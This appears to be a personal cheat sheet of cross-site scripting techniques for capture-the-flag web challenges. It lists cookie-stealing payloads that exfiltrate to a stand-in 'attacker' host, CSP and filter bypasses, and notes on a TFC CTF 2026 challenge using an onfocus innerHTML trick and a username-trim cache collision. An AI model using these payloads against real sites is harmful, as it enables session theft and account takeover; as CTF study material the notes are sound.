# XSS techniques

## Common styles
- Stored XSS in a chat/comment app -> steal an admin bot's cookie/flag; reflected XSS with a bot visiting a URL.

## Key techniques
1. Basic: `<script>fetch('//attacker/?c='+document.cookie)</script>`; `<img src=x onerror=...>`.
2. Steal flag from a logged-in bot: exfil to a webhook/requestbin; read DOM where the flag is rendered.
3. CSP bypass: nonce reuse, `unsafe-inline`, JSONP endpoints, dangling markup, `srcdoc`, DOM clobbering.
4. Filter bypass: case, encoded entities, `onload` vs `onerror`, SVG `<svg onload=...>`, `javascript:` URLs, template literals.
5. Length limits: short payloads, `eval(location.hash)`, event handler tricks.
6. No parentheses/spaces: `onerror=alert\`1\``, `location='//x/'+document.cookie`.
7. Same-origin: use `document.body.innerText` or `location` to exfil flag text.
8. CSRF if no XSS: trigger state-changing actions via image/form auto-submit.

## SEARCH
- "<challenge> xss writeup", "CSP bypass writeup", "stored xss steal cookie writeup"

## References
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

## Tagger (TFC CTF 2026) - autofocus+onfocus -> innerHTML=textContent bypass
- Filters allowed event-handler attr values with only [a-zA-Z0-9,. =] (no parens/quotes).
- Bypass: outer element `<a href=x autofocus onfocus="document.body.innerHTML=this.textContent">FULL_HTML</a>`.
  `this.textContent` returns the original (HTML-escaped) text, so the full payload string is recoverable
  without quotes/parens; `document.body.innerHTML=this.textContent` re-injects it as raw HTML, and the
  inner payload's own inline handlers run under CSP `script-src-attr 'unsafe-inline'`.
- Cache-key collision via usernames with trailing spaces: keys built from `username.trim()`, so
  attacker accounts "Hacker " / "FlagHolder " collide with bot accounts "Hacker"/"FlagHolder".
